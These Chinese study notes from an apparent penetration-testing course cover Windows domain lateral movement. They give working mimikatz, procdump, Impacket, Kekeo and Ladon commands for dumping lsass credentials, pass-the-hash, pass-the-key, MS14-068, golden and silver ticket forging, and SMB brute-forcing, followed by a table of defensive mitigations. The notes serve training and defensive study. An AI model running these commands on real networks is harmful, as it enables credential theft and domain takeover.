---
title: XD安全渗透测试课程 Day67-68 学习笔记：域横向移动 SMB/WMI 利用、PTH/PTK/PTT 票据传递、Kerberos 委派攻击及 Ladon
  内网扫描工具实战
description: 整理 XD安全渗透测试课程第 67-68 天学习内容：Day67 覆盖域横向移动中 SMB 服务利用、WMI 服务利用、明文/哈希传递攻击及
  Procdump+Mimikatz 凭证导出；Day68 深入讲解 PTH（Pass the Hash）、PTK（Pass the Key）、PTT（Pass
  the Ticket）三大凭证复用技术，含 Kerberos 协议原理、MS14-068 漏洞利用、黄金/白银票据生成、Kekeo 工具实战及本地票据导入导出，最后演示国产
  Ladon 内网扫描器的存活主机发现与协议扫描功能。
category: program-analysis
tags:
- XD安全
- 渗透测试
- 内网渗透
- 域横向移动
- SMB
- WMI
- Pass the Hash
- Pass the Key
- Pass the Ticket
- Kerberos
- MS14-068
- 黄金票据
- 白银票据
- Mimikatz
- Kekeo
- Ladon
- Procdump
- Impacket
- 学习笔记
date: '2024-01-15'
updated: '2026-11-15'
---
## 概述

本页面整理自 XD安全渗透测试课程 Day67-68 的学习笔记，重点记录**域环境下的横向移动技术**与**Kerberos 认证体系下的凭证复用攻击**。Day67 侧重于利用 SMB 与 WMI 服务进行明文或 NTLM Hash 传递的实战操作；Day68 系统讲解 PTH/PTK/PTT 三大票据传递技术的原理差异、适用场景及工具化利用流程，并补充国产内网扫描工具 Ladon 的基础用法。内容贯穿“凭证获取 → 横向移动 → 权限维持”的内网渗透核心链路，适合红队实战与 OSCP 风格备考参考。

> **前置知识**：建议先阅读 [[xd-security-internal-network-penetration-notes-day65-66]]（域环境信息收集与 at/schtasks/impacket 横向移动）、[[xd-security-internal-network-penetration-notes-day69-70]]（域横向移动实战与 Cobalt Strike 隧道技术）、[[mimikatz-source-code-architecture-golden-ticket-audit]]（Mimikatz 黄金票据源码解析）、[[lm-ntlm-hash-generation-analysis]]（LM/NTLM Hash 生成算法深度解析）。

---

## Day67：域横向移动 —— SMB 与 WMI 服务利用

### Windows 凭证存储与获取限制

| 系统版本 | 默认行为 | 补丁影响 |
|----------|----------|----------|
| Windows 2012+ | 默认关闭 WDigest，内存中不保存明文密码 | — |
| Windows 2012 以下 | 安装 **KB2871997** 补丁后，同样无法从内存获取明文 | 补丁强制禁用 WDigest |

**应对策略**：
1. **哈希传递**（PTH / PTK / PTT）  
2. **利用其他服务协议**（SMB、WMI 等）直接用 Hash 认证  
3. **注册表修改** 重新开启 `UseLogonCredential` 以获取明文  
4. **离线破解**（Hashcat 等）尝试还原明文  

> 相关基础：[[lm-ntlm-hash-generation-analysis]] 详细剖析了 LM/NTLM Hash 的生成算法与 C++ 实现细节。

### 凭证导出实战：Procdump + Mimikatz

当 Mimikatz 直接上传被杀毒软件拦截时，可采用 **官方签名工具 Procdump** 导出 `lsass.dmp` 再本地离线分析：

```bash
# 目标主机执行
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# 攻击机本地执行
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

**Hashcat 离线破解 NTLM Hash**：

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt
```

### SMB 服务横向移动（端口 445）

#### PsExec 变体

| 方式 | 特点 | 命令示例 |
|------|------|----------|
| **先建 IPC$ 再 PsExec** | 需要明文或 Hash 建立会话 | `net use \\192.168.3.32\ipc$ "pass" /user:administrator && psexec \\192.168.3.32 -s cmd` |
| **直接提供凭证** | 官方 PsTools **不支持 Hash** 传递 | `psexec \\192.168.3.32 -u administrator -p "pass" -s cmd` |
| **Impacket 实现 Hash 传递** | Python 编写，支持 NTLM Hash 直接认证 | `psexec.py -hashes :<NTLM> administrator@192.168.3.32` |

> **工具链关联**：Impacket 套件亦是 [[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]] 中 SMB Beacon 通信的底层协议实现参考。

#### smbexec（无需 IPC$）

```bash
# 明文
smbexec.py administrator:"pass"@192.168.3.32

# Hash 传递
smbexec.py -hashes :<NTLM> administrator@192.168.3.32
```

**优势**：无需预建 IPC$ 连接，日志痕迹相对较少。

### WMI 服务横向移动（端口 135）

WMI 通过 DCOM/RPC（135 端口）实现远程命令执行，**支持明文与 Hash 认证**，且**不在目标主机安全日志留下 4624 登录记录**，隐蔽性优于 SMB。

| 工具/方式 | 认证类型 | 回显 | 备注 |
|-----------|----------|------|------|
| **wmic** (系统自带) | 仅明文 | 无回显 | 功能受限，适合简单命令下发 |
| **wmiexec.vbs** | 明文 / Hash | 有回显 (需配合 nc) | 需上传脚本文件 |
| **Impacket wmiexec.py** | 明文 / Hash | 有回显 | 推荐，跨平台无依赖 |

**实战示例**：

```bash
# wmic 无回显执行命令
wmic /node:192.168.3.32 /user:administrator /password:"pass" process call create "cmd /c whoami > C:\1.txt"

# wmiexec.py Hash 传递反弹 Shell
wmiexec.py -hashes :<NTLM> administrator@192.168.3.32
```

> **检测视角**：SMB 命名管道创建/连接可被 [[named-pipe-smb-detection-sysmon]] 中的 Sysmon Event ID 17/18 捕获；WMI 事件订阅持久化则常被 EDR 监控。

### 批量化利用思路

编写 Python 脚本调用上述接口，编译为 EXE（如 `pyinstaller -F`）投递至跳板机，实现**多目标并发横向**。常见框架：`impacket`、`psexec.py`、`smbexec.py`、`wmiexec.py` 均支持命令行参数化，易于脚本化集成。

---

## Day68：PTH / PTK / PTT —— Kerberos 体系下的凭证复用攻击

### 核心概念对比

| 技术 | 利用凭证 | 认证协议 | 适用条件 | 典型工具 |
|------|----------|----------|----------|----------|
| **PTH (Pass the Hash)** | NTLM Hash (LM/NT) | NTLM | 未打 KB2871997 或本地管理员 | Mimikatz `sekurlsa::pth` |
| **PTK (Pass the Key)** | AES256 / AES128 / DES Key | Kerberos (AES 加密) | 已打补丁环境，需导出 ekeys | Mimikatz `sekurlsa::ekeys` + `sekurlsa::pth` |
| **PTT (Pass the Ticket)** | TGT / ST (Kerberos 票据) | Kerberos | 拥有票据导出权限 (通常需高权限) | Mimikatz `kerberos::ptt`、Kekeo、Rubeus |

> **Kerberos 协议速览**：KDC(AS/TGS) → AS-REQ/REP (获取 TGT) → TGS-REQ/REP (获取 ST) → AP-REQ/REP (访问服务)。详见 [[mimikatz-source-code-architecture-golden-ticket-audit]] 中的 PAC 构造与 BER 编码流程。

### PTH 实战：Mimikatz 传递 NTLM Hash

```bash
# 1. 导出所有登录凭证 (含 NTLM Hash)
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit

# 2. 严谨做法：同时收集 LM 与 NTLM (部分旧系统仍需 LM)
# 3. 利用 NTLM Hash 发起 PTH 攻击
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:corp /ntlm:<NTLM_HASH> /run:cmd.exe" exit
```

**补丁影响矩阵**：

| 环境 | 未打补丁 | 打 KB2871997 |
|------|----------|--------------|
| **工作组** | 所有用户可连 | 仅 Administrator 可连 |
| **域环境** | 所有域用户可连 | 仅域管/本地管理员可连 |

### PTK 实战：传递 AES Key

针对**已打补丁、禁用 NTLM 回落**的环境，利用 Kerberos AES 密钥。

```bash
# 1. 导出 ekeys (包含 aes256_hmac, aes128_hmac, des_cbc_md5 等)
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit

# 2. 使用 aes256 发起 PTK
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:corp /aes256:<AES256_KEY> /run:cmd.exe" exit
```

**关键点**：PTK 仅在**补丁生效后**可用，且要求目标服务支持 Kerberos AES 加密（现代域环境默认支持）。

### PTT 实战：票据传递与权限维持

PTT 分为三大类攻击面：

#### MS14-068 (CVE-2014-6324) —— 普通用户提升至域管

**前提**：域控未安装 **KB3011780**，攻击者拥有任意域用户凭证。

```bash
# 1. 获取当前用户 SID
whoami /user

# 2. 清空本地票据缓存 (防干扰)
mimikatz.exe "kerberos::purge" exit

# 3. 利用 MS14-068 生成伪造 TGT (需 Python 版或 C# 版 exp)
MS14-068.exe -u user@domain -s <SID> -d <DC_IP> -p <password>

# 4. 将生成的 .ccache 票据注入内存
mimikatz.exe "kerberos::ptc TGT_user@domain.ccache" exit

# 5. 验证
klist
dir \\DC_IP\C$
```

#### 黄金票据 —— 域内最高权限持久化

**需求**：域 `krbtgt` 账户的 NTLM/AES Key（需域管权限获取）。

```bash
# 1. 导出 krbtgt hash (需在域控或已有域管权限的机器上)
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt" exit

# 2. 生成黄金票据 (有效期默认 10 年，可伪造任意用户/组)
mimikatz.exe "kerberos::golden /user:fakeadmin /domain:corp /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /id:500 /groups:512,513,519,520 /ticket:golden.kirbi" exit

# 3. 注入使用
mimikatz.exe "kerberos::ptt golden.kirbi" exit
```

> **源码级解析**：[[mimikatz-source-code-architecture-golden-ticket-audit]] 完整还原了 `kuhl_m_kerberos_golden` 函数的 PAC 构造、加密体系选型与 BER 序列化流程。

#### 白银票据 —— 服务级持久化

**需求**：目标服务账户（如 MSSQL、HTTP、CIFS）的 NTLM Hash。

```bash
# 生成针对特定 SPN 的 ST (Service Ticket)
mimikatz.exe "kerberos::golden /user:fake /domain:corp /sid:<DOMAIN_SID> /target:sql01.corp /service:MSSQLSvc /rc4:<SERVICE_NTLM> /ticket:silver.kirbi" exit

# 注入后仅能访问该服务，不触发 KDC 校验，隐蔽性更强
mimikatz.exe "kerberos::ptt silver.kirbi" exit
```

#### Kekeo 工具链 (Benjamin Delpy 另一力作)

Kekeo 专注于 Kerberos 票据操作，支持 **ASK TGT / ASK TGS / 票据转换 / 票据注入**。

```bash
# 1. 请求 TGT (需用户 Hash 或密码)
kekeo.exe "tgt::ask /user:user /domain:corp /password:pass" exit

# 2. 基于 TGT 请求特定服务 ST
kekeo.exe "tgs::s4u /tgt:TGT_user@corp.kirbi /user:targetuser@corp /service:cifs/dc01.corp" exit

# 3. 注入票据
kekeo.exe "ticket::inject /ticket:ST_cifs_dc01.kirbi" exit
```

#### 本地票据导出/导入 (需高权限)

```bash
# 导出当前会话所有票据 (生成 .kirbi 文件)
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# 导入票据
mimikatz.exe "kerberos::ptt <ticket.kirbi>" exit
```

**局限性**：票据默认生命周期 **10 小时** (可配置)，过期后需重新获取。

---

## 国产内网扫描利器 —— Ladon 实战演示

Ladon 是一款 Go 语言编写的内网综合扫描工具，提供 **GUI 与 CLI 双模式**，功能覆盖**存活探测、端口/服务扫描、漏洞检测、口令爆破、横向移动**等。

### GUI 基础操作

1. 启动 `Ladon.exe` 进入图形界面  
2. 目标输入框填写 CIDR 或 IP 列表  
3. 模块勾选：`OnlinePC` (存活探测) → `PortScan` → `SMB` / `WMI` / `RDP` 等协议扫描  
4. 点击 **Start** 扫描，结果可导出 CSV/JSON  

### CLI 批量化示例

```bash
# 存活主机发现 (ICMP + ARP + NetBIOS)
Ladon.exe 192.168.3.0/24 OnlinePC -o alive.txt

# 端口扫描 (指定端口/全端口)
Ladon.exe -f alive.txt PortScan -p 445,135,139,3389 -o portscan.txt

# SMB 爆破/哈希喷射
Ladon.exe -f portscan.txt SMB -u administrator -p password.txt -o smb_brute.txt

# WMI 执行命令 (需凭证)
Ladon.exe -f portscan.txt WMI -u admin -p "pass" -c "whoami" -o wmi_exec.txt
```

**优势**：单二进制无依赖、跨平台、扫描速度快、模块化设计易于二次开发集成至自动化流水线。

---

## 纵向对比与防御建议

| 攻击阶段 | 关键技术 | 检测/缓解措施 |
|----------|----------|---------------|
| **凭证获取** | Mimikatz、Procdump、LSASS Dump | 开启 Credential Guard、LSA 保护 (RunAsPPL)、EDR 监控 `lsass.exe` 访问 |
| **SMB 横向** | PsExec、smbexec、Impacket | 禁用 SMBv1、限制 445 端口、监控 Event ID 4624 Type 3 / Sysmon 17/18 命名管道 |
| **WMI 横向** | wmic、wmiexec、DCOM | 监控 `WmiPrvSE.exe` 启动异常子进程、限制 135/RPC 动态端口、启用 WMI 审核 |
| **PTH/PTK** | Mimikatz `sekurlsa::pth` | 强制 Kerberos AES、禁用 NTLM (组策略)、部署 ATA/Defender for Identity |
| **PTT (黄金/白银/MS14-068)** | 票据伪造与注入 | 定期轮换 `krbtgt` 密钥 (双次轮换)、打补丁 KB3011780、监控异常 TGT/ST 申请 (Event ID 4768/4769) |
| **内网扫描** | Ladon、fscan、Nmap | 网络微隔离、蜜罐部署 (参考 [[xd-security-blue-team-defense]] 中 HFish 实战)、流量基线异常告警 |

---

## 交叉引用导航

- **前序笔记**：[[xd-security-internal-network-penetration-notes-day65-66]]（域环境信息收集与 at/schtasks/impacket 横向移动）、[[xd-security-internal-network-penetration-notes-day69-70]]（域横向实战与 Cobalt Strike 隧道）、[[xd-security-internal-network-penetration-notes-day71-72]]（ICMP/DNS 隧道与会话移交）  
- **工具深度解析**：[[mimikatz-source-code-architecture-golden-ticket-audit]]、[[lm-ntlm-hash-generation-analysis]]、[[named-pipe-smb-detection-sysmon]]、[[smb-named-pipe-c2-communication]]、[[cobalt-strike-external-c2-smb-beacon]]  
- **红队基础设施**：[[internal-network-pivoting-techniques]]（Venom/Frp/SSH/SMB Beacon 代理对比）、[[c2-redirectors-malleable-c2-profiles]]（流量混淆）  
- **蓝队防御体系**：[[xd-security-blue-team-defense]]（ATT&CK 映射、蜜罐、NIDS/HIDS、检测规则编写）  
- **课程全景**：[[xd-security-pentest-course-curriculum]]（88 天大纲与资源下载）

---

## 结语

Day67-68 笔记串联了**从凭证获取到横向移动、再到票据级持久化**的完整攻击链。实战中建议：
1. **优先评估补丁级别** 决定 PTH/PTK/PTT 选择；  
2. **组合使用 SMB 与 WMI** 规避单一协议监控；  
3. **票据攻击作为权限维持首选**，但需严格控制 `krbtgt` 轮换周期；  
4. **自动化扫描 (Ladon/fscan) + 手工验证** 相结合，提升内网资产发现效率。

后续 Day69-72 将进一步展开 **Cobalt Strike 团队协作、隧道技术深度、会话移交与应急响应溯源**，敬请关注。

## 来源

- [0x00实验室-202108-202304_107](../sources/0x00实验室-202108-202304_107.md)
